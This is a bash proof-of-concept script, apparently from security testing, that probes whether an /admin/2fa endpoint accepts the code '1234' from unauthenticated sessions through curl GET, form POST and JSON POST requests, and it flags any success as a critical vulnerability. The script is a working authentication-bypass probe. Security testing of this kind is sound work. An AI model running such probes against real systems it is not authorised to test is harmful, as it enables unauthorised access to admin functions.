#!/bin/bash

# POC: Missing Authentication State Validation on 2FA Endpoint
# This script demonstrates that the /admin/2fa endpoint accepts 2FA code submissions
# without any prior authentication, completely bypassing the authentication state validation

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

echo "=========================================="
echo "Testing: Missing Auth State Validation on 2FA"
echo "Target: $TARGET_URL/admin/2fa"
echo "=========================================="
echo

# Test 1: GET /admin/2fa from fresh session (should redirect to login, not show form)
echo "[TEST 1] GET /admin/2fa from fresh/unauthenticated session"
echo "Expected: Redirect to login or 401/403 error"
echo "Actual:"
response=$(curl -s -i -c "$COOKIE_JAR" "$TARGET_URL/admin/2fa" 2>/dev/null)
http_code=$(echo "$response" | head -1 | awk '{print $2}')
has_form=$(echo "$response" | grep -c 'type="password"\|<input.*code\|<form')

echo "HTTP Status: $http_code"
if [ "$http_code" = "200" ]; then
  echo "Status 200 - Server accepted unauthenticated request"
  if [ "$has_form" -gt 0 ]; then
    echo "VULNERABLE: 2FA form returned without authentication! (Found $has_form form elements)"
  fi
else
  echo "Status $http_code - Server properly rejected unauthenticated request"
fi
echo

# Test 2: POST 2FA code from unauthenticated session using form data
echo "[TEST 2] POST 2FA code=1234 from unauthenticated session (form data)"
echo "Expected: Should deny - user not authenticated"
echo "Actual:"
response=$(curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -X POST \
  -d 'code=1234' \
  "$TARGET_URL/admin/2fa" 2>/dev/null)
http_code=$(echo "$response" | head -1 | awk '{print $2}')
body=$(echo "$response" | tail -n +12)
success_match=$(echo "$body" | grep -i 'success')

echo "HTTP Status: $http_code"
echo "Response body snippet: $(echo "$body" | head -c 100)"
if echo "$body" | grep -qi 'success.*true\|you.*logged\|welcome'; then
  echo "VULNERABLE: 2FA code accepted without prior authentication!"
fi
echo

# Test 3: POST 2FA code from unauthenticated session using JSON
echo "[TEST 3] POST 2FA code=1234 from unauthenticated session (JSON)"
echo "Expected: Should deny - user not authenticated"
echo "Actual:"
rm "$COOKIE_JAR"
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

response=$(curl -s -i -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"code":"1234"}' \
  "$TARGET_URL/admin/2fa" 2>/dev/null)
http_code=$(echo "$response" | head -1 | awk '{print $2}')
body=$(echo "$response" | tail -n +12)

echo "HTTP Status: $http_code"
echo "Response body: $body"
if echo "$body" | grep -qi '"success".*true'; then
  echo "CRITICAL VULNERABILITY: 2FA code accepted without authentication (JSON)!"
fi
echo

# Test 4: Multiple consecutive requests from fresh sessions
echo "[TEST 4] Multiple consecutive unauthenticated requests (3x)"
echo "Expected: Should fail all attempts"
echo "Actual:"
success_count=0
for i in {1..3}; do
  NEW_JAR=$(mktemp)
  response=$(curl -s -i -b "$NEW_JAR" -c "$NEW_JAR" \
    -X POST \
    -d 'code=1234' \
    "$TARGET_URL/admin/2fa" 2>/dev/null)
  http_code=$(echo "$response" | head -1 | awk '{print $2}')
  body=$(echo "$response" | tail -n +12)
  
  if echo "$body" | grep -qi 'success.*true'; then
    ((success_count++))
    echo "Request $i: HTTP $http_code - SUCCESS (VULNERABLE!)"
  else
    echo "Request $i: HTTP $http_code - FAILED"
  fi
  rm "$NEW_JAR"
done
echo "Result: $success_count/3 unauthenticated requests succeeded"
if [ "$success_count" -ge 2 ]; then
  echo "CRITICAL VULNERABILITY CONFIRMED: Multiple unauthenticated 2FA submissions succeeded!"
fi
echo

echo "=========================================="
echo "POC Complete"
echo "If unauthenticated requests succeed, the"
echo "/admin/2fa endpoint lacks proper auth"
echo "state validation - CRITICAL vulnerability"
echo "=========================================="